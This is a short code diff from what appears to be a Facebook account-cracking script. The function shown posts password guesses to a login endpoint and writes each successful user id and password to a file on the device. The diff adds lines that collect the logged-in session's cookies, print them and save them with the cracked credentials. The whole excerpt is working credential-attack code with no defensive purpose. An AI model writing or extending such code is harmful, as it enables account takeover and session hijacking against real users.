@@ -417,8 +417,11 @@ def _M2_(ids,pasx):
                         BLACK=session.post(url1,data=data, headers=head).json()
                         if 'session_key' in BLACK:
                                 uid = BLACK["uid"]
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
                                 open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
+				print(f"\r\033[38;5;46mCOOKIES=[🤖]: \033[1;37m{coki}\33[1;36m")
+				open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 ok.append(uid)
                                 break
                         elif 'www.facebook.com' in str(BLACK):
